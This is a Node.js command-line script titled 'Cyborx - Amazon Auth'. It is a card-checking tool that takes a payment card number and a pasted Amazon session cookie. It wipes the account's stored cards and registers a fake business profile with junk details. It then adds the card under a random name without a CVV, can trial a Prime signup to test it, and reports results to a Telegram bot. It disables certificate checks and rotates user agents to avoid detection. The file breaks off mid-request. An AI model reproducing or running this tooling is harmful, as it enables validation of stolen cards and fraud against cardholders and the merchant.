// index.js
const axios  = require('axios');
const https  = require('https');
const readline = require('readline');
require('dotenv').config();

const httpsAgent = new https.Agent({ rejectUnauthorized: false });
const rl  = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = (q) => new Promise(r => rl.question(q, r));

// ─── Helpers string (igual que PHP) ──────────────────────────────────────────
function dados(str, start, end) {
    if (!str) return '';
    const idx = str.indexOf(start);
    if (idx === -1) return '';
    const sub  = str.slice(idx + start.length);
    const idx2 = sub.indexOf(end);
    return idx2 === -1 ? '' : sub.slice(0, idx2);
}

function dados2(str, start, end, num) {
    if (!str) return '';
    const parts = str.split(start);
    if (!parts[num]) return '';
    return parts[num].split(end)[0];
}

function corrigirTokens(input) {
    input = input.replace(/="([^"]*) ([^"]*)"/g, (m, p1, p2) => `="${p1}+${p2}"`);
    input = input.replace(/(session-id-time=\d+) (\w)/g, '$1$2');
    return input;
}

// ─── User-Agent ───────────────────────────────────────────────────────────────
function generateUserAgent() {
    const cv = ['116.0.0.0', '115.0.0.0', '114.0.0.0'];
    const ev = ['116.0.1938.69', '115.0.1916.77', '114.0.1803.45'];
    const c  = cv[Math.floor(Math.random() * cv.length)];
    const e  = ev[Math.floor(Math.random() * ev.length)];
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${c} Safari/537.36 Edg/${e}`;
}

// ─── letras ───────────────────────────────────────────────────────────────────
function letras3(size) {
    const b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let r = '';
    for (let i = 0; i < size; i++) r += b[Math.floor(Math.random() * b.length)];
    return r;
}

// ─── BIN Info ─────────────────────────────────────────────────────────────────
async function getBinInfo(bin) {
    try {
        const res = await axios.get(`https://bins.antipublic.cc/bins/${encodeURIComponent(bin)}`, {
            headers: { 'Accept': 'application/json', 'User-Agent': generateUserAgent() },
            httpsAgent, timeout: 10000
        });
        const d = res.data;
        return {
            brand:        d.brand        || 'UNKNOWN',
            card_type:    d.type         || 'UNKNOWN',
            level:        d.level        || 'STANDARD',
            issuer:       d.bank         || 'Unknown',
            country_info: `${d.country_name || 'Unknown'} ${d.country_flag || ''}`
        };
    } catch {
        return { brand: 'UNKNOWN', card_type: 'UNKNOWN', level: 'STANDARD', issuer: 'Unknown', country_info: 'Unknown' };
    }
}

// ─── Edit Cookie ──────────────────────────────────────────────────────────────
function editCookie(target, cookie) {
    const map = {
        AU: { code: 'acbau', lang: 'en_AU', currency: 'AUD' },
        DE: { code: 'acbde', lang: 'de_DE', currency: 'EUR' },
        CA: { code: 'acbca', lang: 'en_CA', currency: 'CAD' },
        CN: { code: 'acbcn', lang: 'zh_CN', currency: 'CNY' },
        SG: { code: 'acbsg', lang: 'en_SG', currency: 'SGD' },
        ES: { code: 'acbes', lang: 'es_ES', currency: 'EUR' },
        US: { code: 'main',  lang: 'en_US', currency: 'USD' },
        FR: { code: 'acbfr', lang: 'fr_FR', currency: 'EUR' },
        NL: { code: 'acbnl', lang: 'nl_NL', currency: 'EUR' },
        IN: { code: 'acbin', lang: 'hi_IN', currency: 'INR' },
        IT: { code: 'acbit', lang: 'it_IT', currency: 'EUR' },
        JP: { code: 'acbjp', lang: 'ja_JP', currency: 'JPY' },
        MX: { code: 'acbmx', lang: 'es_MX', currency: 'MXN' },
        PL: { code: 'acbpl', lang: 'pl_PL', currency: 'PLN' },
        AE: { code: 'acbae', lang: 'ar_AE', currency: 'AED' },
        UK: { code: 'acbuk', lang: 'en_GB', currency: 'GBP' },
        TR: { code: 'acbtr', lang: 'tr_TR', currency: 'TRY' },
        BR: { code: 'acbbr', lang: 'pt_BR', currency: 'BRL' },
        EG: { code: 'acbeg', lang: 'ar_EG', currency: 'EGP' },
        JA: { code: 'acbjp', lang: 'ja_JP', currency: 'JPY' },
    };
    const t = map[target];
    if (!t) return cookie.trim();
    for (const d of Object.values(map)) {
        cookie = cookie.split(d.code).join(t.code);
        cookie = cookie.split(d.lang).join(t.lang);
        cookie = cookie.split(d.currency).join(t.currency);
    }
    return cookie.trim();
}

// ─── Telegram ─────────────────────────────────────────────────────────────────
async function sendTelegram(botToken, chatId, msg) {
    if (!botToken || !chatId) return;
    try {
        await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            new URLSearchParams({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: 'true' }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 30000 }
        );
    } catch (e) { console.error('Telegram error:', e.message); }
}

// ─── Delete Card ──────────────────────────────────────────────────────────────
async function deleteCard(cookie) {
    try {
        const r0 = await axios.get(
            'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
            {
                headers: {
                    'Host': 'www.amazon.com',
                    'Cookie': cookie,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-requested-with': 'XMLHttpRequest',
                    'accept': '*/*',
                    'origin': 'https://www.amazon.com',
                    'referer': 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
                    'user-agent': generateUserAgent()
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        const html = r0.data;
        if (
            !html.includes('Debit card ending in') &&
            !html.includes('Credit card ending in') &&
            !html.includes('card ending')
        ) return 'sem card na conta';

        const token_delete = dados(html, '"serializedState":"', '"');
        const customerID   = dados(html, '"customerID":"', '"');
        const card_id3     = dados(html, '"selectedInstrumentId":"', '"');

        const body1 = `ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22${card_id3}%22%2C%22renderPopover%22%3A%22true%22%7D=&ppw-jsEnabled=true&ppw-widgetState=${encodeURIComponent(token_delete)}&ie=UTF-8`;

        const r1 = await axios.post(
            `https://www.amazon.com/payments-portal/data/widgets2/v1/customer/${customerID}/continueWidget`,
            body1,
            {
                headers: {
                    'Host': 'www.amazon.com',
                    'Cookie': cookie,
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': 'https://www.amazon.com',
                    'referer': 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
                    'user-agent': generateUserAgent()
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        const tk2_if = dados(r1.data, 'name="ppw-widgetState" value="', '"')
                    || dados(r1.data, 'name=\\"ppw-widgetState\\" value=\\"', '\\"');

        const body2 = `ppw-widgetEvent%3ADeleteInstrumentEvent=&ppw-jsEnabled=true&ppw-widgetState=${encodeURIComponent(tk2_if)}&ie=UTF-8`;

        const r2 = await axios.post(
            `https://www.amazon.com/payments-portal/data/widgets2/v1/customer/${customerID}/continueWidget`,
            body2,
            {
                headers: {
                    'Host': 'www.amazon.com',
                    'Cookie': cookie,
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'x-requested-with': 'XMLHttpRequest',
                    'origin': 'https://www.amazon.com',
                    'referer': 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
                    'user-agent': generateUserAgent()
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        return r2.data;
    } catch (e) {
        console.error('deleteCard error:', e.message);
        return '';
    }
}

// ─── Amazon Business PENDING flow ─────────────────────────────────────────────
async function processarPending(cookie, ua) {
    try {
        // Pegar CSRF token
        const r0 = await axios.get('https://www.amazon.com/business/register/org/landing', {
            headers: {
                'Host': 'www.amazon.com',
                'user-agent': ua,
                'cookie': cookie,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        });

        const token = dados(r0.data, 'data-csrf-token="', '"');

        // Registrar org
        await axios.post(
            'https://www.amazon.com/business/register/api/org/registrations?abreg_entryRefTag=ab_reg_notag_moa_bl_ab_reg_dsk&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=AAAAAAAAAABgZaCRVCOa12esbl7LMnXvMAAAAAAAAAByNzyR3fLB775Q7V%2BuNnOf2InSAQ%2F3PSEj31HlFkyEP6w4aCCLGOnq04SK5qX2fQw&abreg_client=biss&abreg_originatingCustomerId=A3AU73I0E2KU43&ref_=ab_reg_notag_rn-biss_cb_ab_reg_dsk&sif_profile=ab-reg',
            'address1=new%20york&address2=&zip=10080&city=NEW%20YORK&state=NY&country=US&voice=17706762438&contactName=fewf%20cewefc&businessName=dwdwdwd&businessType=OTHER&verificationOverrideStatus=&notifyBySms=false&internal=false&warningBypassed=false&existingAddress=false&publicAdministrationSelfDeclaration=false&businessTin=',
            {
                headers: {
                    'device-memory': '8',
                    'anti-csrftoken-a2z': token,
                    'user-agent': ua,
                    'cookie': cookie,
                    'origin': 'https://www.amazon.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'content-type': 'application/x-www-form-urlencoded',
                    'referer': 'https://www.amazon.com/business/register/org/business-info?abreg_entryRefTag=ab_reg_notag_moa_bl_ab_reg_dsk&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        // Business prime page
        await axios.get(
            'https://www.amazon.com/business/register/business-prime?sif_profile=ab-reg&abreg_signature=jdVUBtMjCdM0Apj58w0EM1d9Tvj0Kh-QkVI-2aR5lyE%3D&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHNwAAAAAAAAA3rH85TDYWHevymZnxeecsLscxtqCviS35r6XawPydDumhXKFp7bYSG2%2Fzb2jCWKnVlA7ms7Pn&abreg_client=biss&abreg_originatingCustomerId=A1NZHXDR2VI2BK&ref_=ab_reg_notag_oin_wbp_ab_reg_dsk',
            {
                headers: {
                    'user-agent': ua,
                    'cookie': cookie,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        // Processing
        await axios.get(
            'https://www.amazon.com/business/register/org/processing?sif_profile=ab-reg&abreg_signature=jdVUBtMjCdM0Apj58w0EM1d9Tvj0Kh-QkVI-2aR5lyE%3D&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true',
            {
                headers: {
                    'user-agent': ua,
                    'cookie': cookie,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        // Status
        await axios.get(
            'https://www.amazon.com/business/register/org/status?abreg_signature=_m3KfwVElSFNgDu4v21gotNaQB3_RULjrv7JgCnPOyM%3D&abreg_entryRefTag=ya_d_atf_us_b2b_reg_untargeted_rec&abreg_originatingEmailEncrypted=AAAAAAAAAABzO8mToiVu%2Bg3q4kdVasyHMAAAAAAAAAAyNn9nzh1M8OTa8ORgPYiNeE4p0ghvgrPIz8dqW96egFdr4zvZuv0VfRotb1BTVTQ&abreg_client=biss&abreg_originatingCustomerId=A2S7WOTV1RXEX2&ref_=ab_reg_notag_bl_bs_ab_reg_dsk',
            {
                headers: {
                    'user-agent': ua,
                    'cookie': cookie,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'cache-control': 'max-age=0'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        // Guest onboard
        await axios.get(
            'https://www.amazon.com/business/register/guest/onboard?ref_=ab_reg_notag_bs_gon_ab_reg_dsk',
            {
                headers: {
                    'user-agent': ua,
                    'cookie': cookie,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.amazon.com/business/register/org/status'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

    } catch (e) {
        console.error('processarPending error:', e.message);
    }
}

// ─── Prime Test (amazon.ae) ───────────────────────────────────────────────────
async function primeTeste(cookiesa) {
    try {
        const ua = generateUserAgent();

        const r0 = await axios.get('https://www.amazon.ae/gp/prime/pipeline/membersignup', {
            headers: {
                'Host': 'www.amazon.ae',
                'Cookie': cookiesa,
                'user-agent': ua,
                'viewport-width': '1536',
                'content-type': 'application/x-www-form-urlencoded',
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        });

        const html = r0.data;

        let token_verify    = dados(html, 'name="ppw-widgetState" value="', '"');
        let offerToken      = dados(html, 'name="offerToken" value="', '"');
        let customerId      = dados(html, '"customerId":"', '"');
        let sessionId       = dados(html, '"sessionId":"', '"');
        let instrumentidori = dados(html, 'instrumentId&quot;:[&quot;', '&quot;');
        let metodo          = dados(html, '"selectedInstrumentIds":["', '"');

        if (!customerId)      customerId    = dados(html, '"customerID":"', '"');
        if (!sessionId)       sessionId     = dados(html, 'sessionId&quot;:&quot;', '&').trim();
        if (!instrumentidori) instrumentidori = dados(html, 'value=&quot;instrumentId=', '&').trim();
        if (!token_verify)    token_verify   = dados(html, 'name=&quot;ppw-widgetState&quot; value=&quot;', '&').trim();

        // Save payment preference
        const body1 = `ppw-jsEnabled=true&ppw-widgetState=${encodeURIComponent(token_verify)}&ppw-widgetEvent=SavePaymentPreferenceEvent`;

        const r1 = await axios.post(
            `https://www.amazon.ae/payments-portal/data/widgets2/v1/customer/${customerId}/continueWidget`,
            body1,
            {
                headers: {
                    'Host': 'www.amazon.ae',
                    'Cookie': cookiesa,
                    'viewport-width': '1536',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        const card_id2 = dados(r1.data, '"preferencePaymentMethodIds":"[\\"', '\\"')
                      || dados(r1.data, '"preferencePaymentMethodIds":"["', '"');

        // Actions
        const body2 = [
            `offerToken=${encodeURIComponent(offerToken)}`,
            `session-id=${encodeURIComponent(sessionId)}`,
            `locationID=prime_confirm`,
            `primeCampaignId=SlashPrime`,
            `redirectURL=L2dwL3ByaW1l`,
            `cancelRedirectURL=Lw`,
            `wlpLocation=prime_confirm`,
            `isAsinEligibleForFamilyBenefit=0`,
            `paymentsPortalPreferenceType=PRIME`,
            `paymentsPortalExternalReferenceID=prime`,
            `paymentMethodId=${encodeURIComponent(card_id2)}`,
            `isHorizonteFlow=1`,
            `actionPageDefinitionId=WLPAction_AcceptOffer_HardVet`
        ].join('&');

        const r2 = await axios.post(
            'https://www.amazon.ae/hp/wlp/pipeline/actions',
            body2,
            {
                headers: {
                    'Host': 'www.amazon.ae',
                    'Origin': 'https://www.amazon.ae',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Cookie': cookiesa,
                    'Referer': 'https://www.amazon.ae/gp/prime/pipeline/membersignup'
                },
                httpsAgent, responseType: 'text', maxRedirects: 10
            }
        );

        return r2.data;
    } catch (e) {
        console.error('primeTeste error:', e.message);
        return '';
    }
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
async function main() {
    console.log('\n╔══════════════════════════════════════╗');
    console.log('║        Cyborx - Amazon Auth          ║');
    console.log('╚══════════════════════════════════════╝\n');

    const cc1        = await ask('💳  Tarjeta (CC|MM|AAAA|CVV): ');
    const verificar  = await ask('🍪  Cookie Amazon: ');
    const telegramId = await ask('📨  Telegram ID (Enter para saltar): ');
    const botToken   = process.env.TELEGRAM_BOT_TOKEN || await ask('🤖  Bot Token: ');
    const useProxy   = await ask('🔌  ¿Proxy? (s/n): ');

    let proxy = '';
    if (useProxy.toLowerCase() === 's') {
        const ph = await ask('   Host: ');
        const pp = await ask('   Puerto: ');
        const pu = await ask('   Usuario: ');
        const pw = await ask('   Pass: ');
        proxy = `http://${pu}:${pw}@${ph}:${pp}`;
    }

    rl.close();

    // ── Parseo tarjeta ────────────────────────────────────────────────────────
    const separar = cc1.split('|');
    const cc  = separar[0];
    let   mes = separar[1];
    let   ano = separar[2];
    const cvv = separar[3];

    if (mes && mes.startsWith('0')) mes = mes.slice(1);
    if (ano && parseInt(ano, 10) < 100) ano = '20' + ano;

    const bin  = cc.slice(0, 6);
    const last = cc.slice(12);

    if (isNaN(cc) || (cc.length !== 16 && cc.length !== 15)) {
        console.log('\n❌  Card Not Supported\n');
        process.exit(1);
    }

    // ── Nombres aleatorios ────────────────────────────────────────────────────
    const nombres = ["Smith","Johnson","Williams","Brown","Jones","Miller","Davis","Garcia","Rodriguez","Wilson","Martinez","Anderson","Taylor","Thomas","Moore","Martin","Jackson","Thompson","White","Lopez","Lee","Harris","Clark","Lewis","Robinson","Walker","Hall","Young","Allen","Sanchez","Wright","King","Scott","Green","Baker","Adams","Nelson","Hill","Ramirez","Campbell","Mitchell","Roberts","Carter","Evans","Turner","Torres"];
    const nombre  = nombres[Math.floor(Math.random() * nombres.length)];
    const sobre   = nombres[Math.floor(Math.random() * nombres.length)];
    const ua      = generateUserAgent();
    const tdata   = letras3(16);

    // ── BIN ───────────────────────────────────────────────────────────────────
    console.log('\n⏳  Consultando BIN...');
    const binInfo = await getBinInfo(bin);
    const { brand, card_type, level, issuer, country_info } = binInfo;
    console.log(`ℹ️   ${brand} | ${card_type} | ${level} | ${issuer} | ${country_info}`);
    console.log('\n⏳  Iniciando flujo Amazon...\n');

    // ── Cookies por región ────────────────────────────────────────────────────
    const cookie    = editCookie('US', verificar);
    const cookiesa  = editCookie('AE', verificar);
    const cookiebr  = editCookie('BR', verificar);
    const cookieit  = editCookie('IT', verificar);
    const cookieau  = editCookie('AU', verificar);
    const cookiepl  = editCookie('PL', verificar);
    const cookiesg  = editCookie('SG', verificar);
    const cookiejp  = editCookie('JA', verificar);
    const verificar2 = editCookie('EG', verificar);
    const verificar3 = editCookie('ES', verificar);

    // ── Step 1: Delete card vieja ─────────────────────────────────────────────
    console.log('🗑️   Limpiando card previa...');
    await deleteCard(cookie);

    // ── Step 2: Verificar status de cuenta (PENDING check) ────────────────────
    console.log('🔍  Verificando status de cuenta...');
    const statusRes = await axios.get(
        'https://www.amazon.com/business/register/api/guest/processing-status?abreg_signature=2dM_ZsG5V0BOa-v9A_YhKmq7UlZQoN7vikOfLChV7QE%3D&ref_=ab_reg_notag_gp_cgps_ab_reg_dsk?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false',
        {
            headers: {
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"',
                'sec-ch-device-memory': '8',
                'sec-ch-viewport-width': '563',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'x-requested-with': 'XMLHttpRequest',
                'dpr': '1.25',
                'downlink': '6.8',
                'sec-ch-ua-platform': '"Windows"',
                'device-memory': '8',
                'rtt': '150',
                'sec-ch-ua-mobile': '?0',
                'user-agent': ua,
                'cookie': cookie,
                'viewport-width': '563',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-dpr': '1.25',
                'ect': '4g',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.amazon.com/business/register/guest/processing?ref_=ab_reg_notag_gon_gp_ab_reg_dsk'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        }
    );

    const conta_status = statusRes.data;

    if (conta_status.includes('"PENDING"') || conta_status.includes('PENDING')) {
        console.log('⚠️   Cuenta PENDING, procesando business registration...');
        await processarPending(cookie, ua);
    }

    // ── Step 3: Wallet ────────────────────────────────────────────────────────
    console.log('💼  Accediendo a wallet...');
    const walletRes = await axios.get('https://www.amazon.com/cpe/yourpayments/wallet', {
        headers: {
            'cache-control': 'max-age=0',
            'device-memory': '4',
            'sec-ch-device-memory': '4',
            'dpr': '1',
            'sec-ch-dpr': '1',
            'viewport-width': '1366',
            'sec-ch-viewport-width': '1366',
            'rtt': '50',
            'cookie': cookie,
            'downlink': '5.9',
            'ect': '4g',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.amazon.com/cpe/yourpayments/settings/manageoneclick'
        },
        httpsAgent, responseType: 'text', maxRedirects: 10
    });

    const serializedState = dados(walletRes.data, '"serializedState":"', '"');
    const customerID      = dados(walletRes.data, '"customerID":"', '"');

    // ── Step 4: StartAddInstrumentEvent ───────────────────────────────────────
    console.log('➕  Iniciando add card...');
    const body_addclick = `ppw-jsEnabled=true&ppw-widgetState=${encodeURIComponent(serializedState)}&ppw-widgetEvent=StartAddInstrumentEvent`;

    const r_addclick = await axios.post(
        `https://www.amazon.com/payments-portal/data/widgets2/v1/customer/${customerID}/continueWidget`,
        body_addclick,
        {
            headers: {
                'sec-ch-ua-platform': '"Windows"',
                'viewport-width': '1366',
                'device-memory': '4',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-dpr': '1',
                'sec-ch-ua-mobile': '?0',
                'x-requested-with': 'XMLHttpRequest',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'sec-ch-viewport-width': '1366',
                'downlink': '5.3',
                'widget-ajax-attempt-count': '0',
                'cookie': cookie,
                'ect': '4g',
                'sec-ch-device-memory': '4',
                'dpr': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'rtt': '50',
                'apx-widget-info': 'AB:YA:MPO/desktop/kzHo57KvPxaI',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'origin': 'https://www.amazon.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.amazon.com/cpe/yourpayments/wallet'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        }
    );

    const serializedState_2 = dados(r_addclick.data, '"serializedState\\":\\"', '\\"')
                           || dados(r_addclick.data, '"serializedState":"', '"');
    const clientId = dados(r_addclick.data, '"clientId\\":\\"', '\\"')
                  || dados(r_addclick.data, '"clientId":"', '"');

    // ── Step 5: APX Register page ─────────────────────────────────────────────
    console.log('🔐  Abriendo formulario APX...');
    const body_register = [
        `widgetState=${encodeURIComponent(serializedState_2)}`,
        `returnUrl=%2Fcpe%2Fyourpayments%2Fwallet%3Fref_%3Dapx_interstitial`,
        `clientId=AB%3AYA%3AMPO`,
        `usePopover=true`,
        `maxAgeSeconds=900`,
        `iFrameName=ApxSecureIframe-pp-72TM83-5`,
        `parentWidgetInstanceId=kzHo57KvPxaI`,
        `hideAddPaymentInstrumentHeader=true`,
        `creatablePaymentMethods=CC`
    ].join('&');

    const r_register = await axios.post(
        'https://apx-security.amazon.com/cpe/pm/register',
        body_register,
        {
            headers: {
                'Host': 'apx-security.amazon.com',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Origin': 'https://www.amazon.com',
                'cookie': cookie,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'iframe',
                'Referer': 'https://www.amazon.com/'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        }
    );

    const widgetState = dados(r_register.data, '<input type="hidden" name="ppw-widgetState" value="', '">');

    // ── Step 6: Agregar tarjeta ───────────────────────────────────────────────
    console.log('💳  Agregando tarjeta...');
    const body_addcard = [
        `ppw-widgetEvent%3AAddCreditCardEvent=`,
        `ppw-jsEnabled=true`,
        `ppw-widgetState=${encodeURIComponent(widgetState)}`,
        `ie=UTF-8`,
        `addCreditCardNumber=${cc}`,
        `ppw-accountHolderName=${encodeURIComponent(nombre + ' ' + sobre)}`,
        `ppw-expirationDate_month=${mes}`,
        `ppw-expirationDate_year=${ano}`,
        `addCreditCardVerificationNumber=`,
        `ppw-addCreditCardVerificationNumber_isRequired=false`,
        `ppw-addCreditCardPostalCode=`,
        `ppw-addCreditCardPostalCode_isRequired=false`,
        `ppw-updateEverywhereAddCreditCard=updateEverywhereAddCreditCard`,
        `__sif_encrypted_hba_account_holder_name=${encodeURIComponent(nombre + ' ' + sobre)}`,
        `ppw-issuer=Visa`,
        `usePopover=true`,
        `maxAgeSeconds=900`,
        `iFrameName=ApxSecureIframe-pp-72TM83-5`,
        `parentWidgetInstanceId=kzHo57KvPxaI`,
        `hideAddPaymentInstrumentHeader=true`,
        `creatablePaymentMethods=CC`
    ].join('&');

    const r_addcard = await axios.post(
        `https://apx-security.amazon.com/payments-portal/data/widgets2/v1/customer/${customerID}/continueWidget?sif_profile=APX-Encrypt-All-NA`,
        body_addcard,
        {
            headers: {
                'Host': 'apx-security.amazon.com',
                'Connection': 'keep-alive',
                'sec-ch-ua-platform': '"Windows"',
                'Widget-Ajax-Attempt-Count': '0',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'X-Requested-With': 'XMLHttpRequest',
                'cookie': cookie,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'APX-Widget-Info': 'AB:YA:MPO/desktop/ly5LAUVZHKYh',
                'Origin': 'https://apx-security.amazon.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://apx-security.amazon.com/cpe/pm/register'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        }
    );

    const widgetState_2 = dados(r_addcard.data, 'name=\\"ppw-widgetState\\" value=\\"', '\\"')
                       || dados(r_addcard.data, 'name="ppw-widgetState" value="', '"');
    const address_id    = dados(r_addcard.data, 'data-address-id=\\"', '\\"')
                       || dados(r_addcard.data, 'data-address-id="', '"');

    // ── Step 7: Seleccionar dirección ─────────────────────────────────────────
    console.log('📍  Seleccionando dirección...');
    const body_addr = [
        `ppw-widgetEvent%3ASelectAddressEvent=`,
        `ppw-jsEnabled=true`,
        `ppw-widgetState=${encodeURIComponent(widgetState_2)}`,
        `ie=UTF-8`,
        `ppw-pickAddressType=Inline`,
        `ppw-addressSelection=${encodeURIComponent(address_id)}`
    ].join('&');

    await axios.post(
        `https://apx-security.amazon.com/payments-portal/data/widgets2/v1/customer/${customerID}/continueWidget`,
        body_addr,
        {
            headers: {
                'Host': 'apx-security.amazon.com',
                'Connection': 'keep-alive',
                'sec-ch-ua-platform': '"Windows"',
                'Widget-Ajax-Attempt-Count': '0',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'X-Requested-With': 'XMLHttpRequest',
                'cookie': cookie,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'APX-Widget-Info': 'AB:YA:MPO/desktop/ly5LAUVZHKYh',
                'Origin': 'https://apx-security.amazon.com',
                'Sec-Fetch-Site': 'same-origin',
